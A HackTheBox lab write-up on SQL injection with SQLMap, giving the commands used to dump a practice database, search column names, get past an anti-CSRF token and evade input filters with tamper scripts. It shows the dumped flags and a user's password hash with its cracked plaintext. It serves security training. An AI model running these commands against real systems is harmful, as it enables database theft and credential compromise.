# HTB-Writeup-SQLMAP
HackTheBox Writeup: SQL injection exploitation via SQLMap, focusing on payload precision, dynamic parameter analysis, and database enumeration techniques for penetration testing.

By Ramyar Daneshgar 


### **Technical Write-Up: SQLMap Exploitation Scenarios**

#### **Objective**
This document provides a detailed, technically rigorous walkthrough of SQL injection exploitation using SQLMap, focusing on database enumeration, advanced configurations, and bypassing application-layer protections. The methodology emphasizes precision, parameter analysis, and optimized payload crafting to maximize exploitation efficiency.

---

### **Case 1: Extracting `flag1` from `testdb`**

#### **Objective**
Exploit the SQL injection vulnerability in the GET parameter `id` to retrieve the `flag1` table contents from the `testdb` database.

#### **Steps**

1. **Target Assessment**:  
   Upon navigating to the `case1.php` endpoint, I identified that the `id` parameter was being passed via the query string (`?id=1`). GET parameters are a frequent target for SQLi due to their explicit exposure.

2. **SQLMap Execution**:
   I crafted the following SQLMap command:
   ```bash
   sqlmap -u 'http://STMIP:STMPO/case1.php?id=1' -D testdb -T flag1 --batch --dump
   ```
   **Rationale**:
   - **`-u`**: Identifies the target URL for testing.
   - **`-D`**: Restricts enumeration to the `testdb` database, reducing noise.
   - **`-T`**: Focuses specifically on the `flag1` table.
   - **`--dump`**: Directs SQLMap to extract and display all table contents.
   - **`--batch`**: Automates decision-making during runtime.

3. **Analysis**:
   SQLMap began by conducting a dynamic content stability test to ensure consistent responses from the server. It then systematically attempted various payloads, identifying the backend DBMS as MySQL and confirming the `id` parameter's susceptibility to injection.

4. **Results**:
   ```plaintext
   +----+-----------------------------------------------------+
   | id | content                                             |
   +----+-----------------------------------------------------+
   | 1  | HTB{c0n6r475_y0u_kn0w_h0w_70_run_b451c_5qlm4p_5c4n} |
   +----+-----------------------------------------------------+
   ```

#### **Technical Takeaways**:
- SQLMap’s DBMS fingerprinting mechanisms ensured payload compatibility with MySQL, streamlining the exploitation process.
- Testing for parameter dynamism was critical; static parameters often indicate a lack of server-side processing.

---

### **Case 2: Identifying Columns Containing “Style”**

#### **Objective**
Enumerate column names containing the term "style" for reconnaissance, leveraging SQLMap’s advanced search capabilities.

#### **Steps**

1. **Rationale**:
   Searching for specific column patterns is a valuable technique for pinpointing sensitive data or narrowing the attack surface, especially when dealing with large databases.

2. **Command Execution**:
   ```bash
   sqlmap -u 'http://STMIP:STMPO/case1.php?id=1' --search -C style --batch
   ```
   **Explanation**:
   - **`--search`**: Activates SQLMap’s search feature.
   - **`-C style`**: Filters results to columns containing the string "style."

3. **Results**:
   SQLMap identified the following column:
   ```plaintext
   +-----------------+------------+
   | Column          | Type       |
   +-----------------+------------+
   | PARAMETER_STYLE | varchar(8) |
   +-----------------+------------+
   ```

#### **Technical Takeaways**:
- This approach minimized unnecessary data retrieval, showcasing SQLMap's ability to perform precise searches.
- Enumerating metadata (e.g., column names) is a foundational step in understanding database structure for further exploitation.

---

### **Case 3: Extracting Kimberly’s Password**

#### **Objective**
Leverage SQLMap to enumerate the `users` table and retrieve a hashed password belonging to the user “Kimberly.”

#### **Steps**

1. **Exploration**:
   The database `testdb` contained a `users` table with various entries, including sensitive user information.

2. **SQLMap Execution**:
   ```bash
   sqlmap -u 'http://STMIP:STMPO/case1.php?id=1' --batch --dump
   ```

3. **Results**:
   SQLMap revealed the following entry:
   ```plaintext
   | Kimberly Wright | d642ff0feca378666a8727947482f1a4702deba0 (Enizoom1609) |
   ```

4. **Password Analysis**:
   - The extracted hash was analyzed and resolved to the plaintext password `Enizoom1609`.
   - This underscores the importance of securing hashed values with robust salting mechanisms.

#### **Technical Takeaways**:
- SQLMap’s row-by-row dumping allowed me to focus on specific users within a large dataset.
- Lack of hashing best practices (e.g., salting) rendered the password vulnerable to dictionary and rainbow table attacks.

---

### **Case 8: Bypassing CSRF Protections**

#### **Objective**
Exploit the POST parameter `id` while handling anti-CSRF tokens to extract `flag8`.

#### **Steps**

1. **Token Identification**:
   - Using the browser’s Developer Tools, I intercepted the POST request to `case8.php`.
   - The anti-CSRF token was embedded in the payload as `t0ken`.

2. **SQLMap Execution**:
   ```bash
   sqlmap -u 'http://STMIP:STMPO/case8.php' --data 'id=1&t0ken=CSRF-TOKEN' --csrf-token=t0ken --batch --dump
   ```
   **Explanation**:
   - **`--csrf-token`**: Specifies the token parameter to dynamically fetch and include in SQLMap’s requests.
   - **`--data`**: Ensures the payload replicates the application’s behavior.

3. **Results**:
   ```plaintext
   +----+-----------------------------------+
   | id | content                           |
   +----+-----------------------------------+
   | 1  | HTB{y0u_h4v3_b33n_c5rf_70k3n1z3d} |
   +----+-----------------------------------+
   ```

#### **Technical Takeaways**:
- Anti-CSRF tokens can be bypassed if SQLMap is configured to handle them dynamically.
- Intercepting and understanding token mechanisms is critical for bypassing client-side protections.

---

### **Case 11: Leveraging Tamper Scripts**

#### **Objective**
Bypass filtering mechanisms on the GET parameter `id` using SQLMap’s tamper scripts.

#### **Steps**

1. **Rationale**:
   Tamper scripts are essential when dealing with WAFs or other input validation mechanisms that reject typical SQL payloads.

2. **SQLMap Execution**:
   ```bash
   sqlmap -u 'http://STMIP:STMPO/case11.php?id=1' --tamper=between -T flag11 --batch --dump
   ```
   **Explanation**:
   - **`--tamper=between`**: Obfuscates SQL payloads by inserting comments or special characters between keywords.

3. **Results**:
   ```plaintext
   +----+----------------------------+
   | id | content                    |
   +----+----------------------------+
   | 1  | HTB{5p3c14l_ch4r5_n0_m0r3} |
   +----+----------------------------+
   ```

#### **Technical Takeaways**:
- Tamper scripts allowed me to bypass stringent filters by crafting obfuscated payloads.
- Customizing tamper scripts can further enhance SQLMap’s adaptability against advanced WAFs.

---

### **Lessons Learned**

1. **Dynamic Parameter Testing**:
   SQLMap’s heuristics for identifying dynamic parameters were invaluable. Without this, testing static or non-processed parameters wastes resources.

2. **Tailored Payloads**:
   Using tamper scripts and advanced options like `--technique` allowed me to bypass sophisticated defenses.

3. **Understanding Application Behavior**:
   Intercepting requests and identifying anti-CSRF mechanisms were critical to mimicking real application interactions.

4. **Database Fingerprinting**:
   SQLMap’s ability to identify the backend DBMS (e.g., MySQL) ensured that only compatible payloads were sent, increasing efficiency and success rates.

5. **Authentication and Session Handling**:
   Tokens and session cookies must be handled dynamically to maintain access during exploitation.

